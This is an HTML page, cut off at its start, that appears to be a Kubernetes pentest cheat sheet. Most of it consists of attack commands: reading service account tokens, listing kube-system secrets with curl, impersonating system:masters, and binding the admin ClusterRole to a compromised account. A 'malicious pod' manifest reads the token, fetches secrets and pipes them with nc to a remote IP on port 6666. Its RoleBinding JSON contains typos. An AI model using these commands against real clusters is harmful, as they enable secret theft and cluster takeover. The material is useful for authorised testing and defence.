</span></span><span style=display:flex><span>I1028 <span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38.295760</span>   <span style=color:#ae81ff>76118</span> round_trippers.go<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>444</span>] Response Headers<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><h2 id=information-gathering>Information Gathering
<a class=anchor href=#information-gathering>#</a></h2><h3 id=service-account-permissions>Service Account Permissions
<a class=anchor href=#service-account-permissions>#</a></h3><p>The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier.
The following can be used to determine the service account&rsquo;s permissions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Namespace-level permissions using kubectl</span>
</span></span><span style=display:flex><span>kubectl auth can-i --list
</span></span><span style=display:flex><span><span style=color:#75715e># Cluster-level permissions using kubectl</span>
</span></span><span style=display:flex><span>kubectl auth can-i --list --namespace=kube-system
</span></span><span style=display:flex><span><span style=color:#75715e># Permissions list using curl</span>
</span></span><span style=display:flex><span>NAMESPACE=$(cat <span style=color:#e6db74>&#34;/var/run/secrets/kubernetes.io/serviceaccount/namespace&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># For cluster-level, use NAMESPACE=&#34;kube-system&#34; instead</span>
</span></span><span style=display:flex><span>MASTER_URL=<span style=color:#e6db74>&#34;https://</span>${KUBERNETES_SERVICE_HOST}<span style=color:#e6db74>:</span>${KUBERNETES_SERVICE_PORT}<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>TOKEN=$(cat <span style=color:#e6db74>&#34;/var/run/secrets/kubernetes.io/serviceaccount/token&#34;</span>)
</span></span><span style=display:flex><span>curl <span style=color:#e6db74>&#34;</span>${MASTER_URL}<span style=color:#e6db74>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&#34;</span> \
</span></span><span style=display:flex><span>  --cacert <span style=color:#e6db74>&#34;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt&#34;</span> \
</span></span><span style=display:flex><span>  --header <span style=color:#e6db74>&#34;Authorization: Bearer </span>${TOKEN}<span style=color:#e6db74>&#34;</span> \
</span></span><span style=display:flex><span>  --header <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> \
</span></span><span style=display:flex><span>  --data <span style=color:#e6db74>&#39;{&#34;kind&#34;:&#34;SelfSubjectRulesReview&#34;,&#34;apiVersion&#34;:&#34;authorization.k8s.io/v1&#34;,&#34;spec&#34;:{&#34;namespace&#34;:&#34;&#39;</span>${NAMESPACE}<span style=color:#e6db74>&#39;&#34;}}&#39;</span>
</span></span></code></pre></div><h3 id=secrets-configmaps-and-volumes>Secrets, ConfigMaps, and Volumes
<a class=anchor href=#secrets-configmaps-and-volumes>#</a></h3><p>Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster.</p><p>From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It&rsquo;s not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with <code>grep -F "tmpfs ro" /etc/mtab</code>.</p><p>True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with <code>grep -wF "ext4" /etc/mtab</code>.</p><h3 id=privileged-containers>Privileged Containers
<a class=anchor href=#privileged-containers>#</a></h3><p>Kubernetes supports a wide range of <a href=https://kubernetes.io/docs/tasks/configure-pod-container/security-context/>security contexts</a> for container and pod execution. The most important of these is the &ldquo;privileged&rdquo; <a href=https://kubernetes.io/docs/concepts/policy/pod-security-policy/>security policy</a> which makes the host node&rsquo;s devices available under the container&rsquo;s <code>/dev</code> directory. This means having access to the host&rsquo;s Docker socket file (allowing arbitrary container actions) in addition to the host&rsquo;s root disks (which can be used to escape the container entirely).</p><p>While there is no official way to check for privileged mode from <em>within</em> a container, checking if <code>/dev/kmsg</code> exists will usually suffice.</p><h2 id=rbac-configuration>RBAC Configuration
<a class=anchor href=#rbac-configuration>#</a></h2><h3 id=listing-secrets>Listing Secrets
<a class=anchor href=#listing-secrets>#</a></h3><p>An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in &ldquo;kube-system&rdquo; namespace.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secrets/
</span></span></code></pre></div><h3 id=access-any-resource-or-verb>Access Any Resource or Verb
<a class=anchor href=#access-any-resource-or-verb>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>resources<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>- <span style=color:#e6db74>&#39;*&#39;</span>
</span></span><span style=display:flex><span>verbs<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>- <span style=color:#e6db74>&#39;*&#39;</span>
</span></span></code></pre></div><h3 id=pod-creation>Pod Creation
<a class=anchor href=#pod-creation>#</a></h3><p>Check your right with <code>kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml</code>.
Then create a malicious pod.yaml file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>v1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Pod</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>alpine</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>kube-system</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>containers</span>:
</span></span><span style=display:flex><span>  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>alpine</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>alpine</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>command</span>: [<span style=color:#e6db74>&#34;/bin/sh&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#f92672>args</span>: [<span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#39;apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H &#34;Authorization: Bearer $TOKEN&#34; -H &#34;Content-Type: application/json&#34; https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000&#39;</span>]
</span></span><span style=display:flex><span>  <span style=color:#f92672>serviceAccountName</span>: <span style=color:#ae81ff>bootstrap-signer</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>automountServiceAccountToken</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>hostNetwork</span>: <span style=color:#66d9ef>true</span>
</span></span></code></pre></div><p>Then <code>kubectl apply -f malicious-pod.yaml</code></p><h3 id=privilege-to-use-podsexec>Privilege to Use Pods/Exec
<a class=anchor href=#privilege-to-use-podsexec>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>kubectl exec -it &lt;POD NAME&gt; -n &lt;PODS NAMESPACE&gt; <span style=color:#960050;background-color:#1e0010>–</span>- sh
</span></span></code></pre></div><h3 id=privilege-to-getpatch-rolebindings>Privilege to Get/Patch Rolebindings
<a class=anchor href=#privilege-to-getpatch-rolebindings>#</a></h3><p>The purpose of this JSON file is to bind the admin &ldquo;CluserRole&rdquo; to the compromised service account.
Create a malicious RoleBinging.json file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;apiVersion&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;rbac.authorization.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;kind&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;RoleBinding&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;metadata&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;name&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;malicious-rolebinding&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;namespcaes&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;default&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;roleRef&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;apiGroup&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;kind&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;ClusterRole&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;name&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;subjects&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;kind&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;ServiceAccount&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;name&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;sa-comp&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;namespace&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;default&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k -v -X POST -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;JWT TOKEN&gt;&#34;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/apis/rbac.authorization.k8s.io/v1/namespaces/<span style=color:#66d9ef>default</span>/rolebindings -d @malicious-RoleBinging.json
</span></span><span style=display:flex><span>curl -k -v -X POST -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;COMPROMISED JWT TOKEN&gt;&#34;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secret
</span></span></code></pre></div><h3 id=impersonating-a-privileged-account>Impersonating a Privileged Account
<a class=anchor href=#impersonating-a-privileged-account>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k -v -XGET -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;JWT TOKEN (of the impersonator)&gt;&#34;</span> -H <span style=color:#e6db74>&#34;Impersonate-Group: system:masters&#34;</span> -H <span style=color:#e6db74>&#34;Impersonate-User: null&#34;</span> -H <span style=color:#e6db74>&#34;Accept: application/json&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secrets/
</span></span></code></pre></div><h2 id=privileged-service-account-token>Privileged Service Account Token
<a class=anchor href=#privileged-service-account-token>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ cat /run/secrets/kubernetes.io/serviceaccount/token
</span></span><span style=display:flex><span>$ curl -k -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/<span style=color:#66d9ef>default</span>/secrets/
</span></span></code></pre></div><h2 id=interesting-endpoints-to-reach>Interesting endpoints to reach
<a class=anchor href=#interesting-endpoints-to-reach>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># List Pods</span>
</span></span><span style=display:flex><span>curl -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/<span style=color:#66d9ef>default</span>/pods/
</span></span><span style=display:flex><span><span style=color:#75715e># List secrets</span>
</span></span><span style=display:flex><span>curl -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip&gt;<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/api/v1/namespaces/<span style=color:#66d9ef>default</span>/secrets/
</span></span><span style=display:flex><span><span style=color:#75715e># List deployments</span>
</span></span><span style=display:flex><span>curl -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/apis/extensions/v1beta1/namespaces/<span style=color:#66d9ef>default</span>/deployments
</span></span><span style=display:flex><span><span style=color:#75715e># List daemonsets</span>
</span></span><span style=display:flex><span>curl -v -H <span style=color:#e6db74>&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;master_ip<span style=color:#960050;background-color:#1e0010>:</span>&lt;port&gt;/apis/extensions/v1beta1/namespaces/<span style=color:#66d9ef>default</span>/daemonsets
</span></span></code></pre></div><h2 id=api-addresses-that-you-should-know>API addresses that you should know
<a class=anchor href=#api-addresses-that-you-should-know>#</a></h2><p><em>(External network visibility)</em></p><h3 id=cadvisor>cAdvisor
<a class=anchor href=#cadvisor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4194</span>
</span></span></code></pre></div><h3 id=insecure-api-server>Insecure API server
<a class=anchor href=#insecure-api-server>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>8080</span>
</span></span></code></pre></div><h3 id=secure-api-server>Secure API Server
<a class=anchor href=#secure-api-server>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span>(<span style=color:#ae81ff>8</span>|<span style=color:#ae81ff>6</span>)<span style=color:#ae81ff>443</span>/swaggerapi
</span></span><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span>(<span style=color:#ae81ff>8</span>|<span style=color:#ae81ff>6</span>)<span style=color:#ae81ff>443</span>/healthz
</span></span><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span>(<span style=color:#ae81ff>8</span>|<span style=color:#ae81ff>6</span>)<span style=color:#ae81ff>443</span>/api/v1
</span></span></code></pre></div><h3 id=etcd-api>etcd API
<a class=anchor href=#etcd-api>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2379</span>
</span></span><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2379</span>/version
</span></span><span style=display:flex><span>etcdctl --endpoints=http<span style=color:#960050;background-color:#1e0010>:</span>//&lt;MASTER-IP&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2379</span> get / --prefix --keys-only
</span></span></code></pre></div><h3 id=kubelet-api>Kubelet API
<a class=anchor href=#kubelet-api>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10250</span>
</span></span><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10250</span>/metrics
</span></span><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10250</span>/pods
</span></span></code></pre></div><h3 id=kubelet-read-only>kubelet (Read only)
<a class=anchor href=#kubelet-read-only>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>curl -k https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;IP Address&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10255</span>
</span></span><span style=display:flex><span>http<span style=color:#960050;background-color:#1e0010>:</span>//&lt;external-IP&gt;<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10255</span>/pods
</span></span></code></pre></div><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1>Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019</a></li><li><a href=https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2>Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019</a></li><li><a href=https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3>Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019</a></li><li><a href=https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</a></li><li><a href=https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation>Kubernetes Pod Privilege Escalation</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/9b89636a69a75bff6c97cba883a46a02d21b7f40 title='Last modified by Stuart Gray | March 28, 2023' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>March 28, 2023</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li><ul><li><a href=#simulating-kubectl-api-requests>Simulating <code>kubectl</code> API Requests</a></li></ul></li><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#service-account-permissions>Service Account Permissions</a></li><li><a href=#secrets-configmaps-and-volumes>Secrets, ConfigMaps, and Volumes</a></li><li><a href=#privileged-containers>Privileged Containers</a></li></ul></li><li><a href=#rbac-configuration>RBAC Configuration</a><ul><li><a href=#listing-secrets>Listing Secrets</a></li><li><a href=#access-any-resource-or-verb>Access Any Resource or Verb</a></li><li><a href=#pod-creation>Pod Creation</a></li><li><a href=#privilege-to-use-podsexec>Privilege to Use Pods/Exec</a></li><li><a href=#privilege-to-getpatch-rolebindings>Privilege to Get/Patch Rolebindings</a></li><li><a href=#impersonating-a-privileged-account>Impersonating a Privileged Account</a></li></ul></li><li><a href=#privileged-service-account-token>Privileged Service Account Token</a></li><li><a href=#interesting-endpoints-to-reach>Interesting endpoints to reach</a></li><li><a href=#api-addresses-that-you-should-know>API addresses that you should know</a><ul><li><a href=#cadvisor>cAdvisor</a></li><li><a href=#insecure-api-server>Insecure API server</a></li><li><a href=#secure-api-server>Secure API Server</a></li><li><a href=#etcd-api>etcd API</a></li><li><a href=#kubelet-api>Kubelet API</a></li><li><a href=#kubelet-read-only>kubelet (Read only)</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>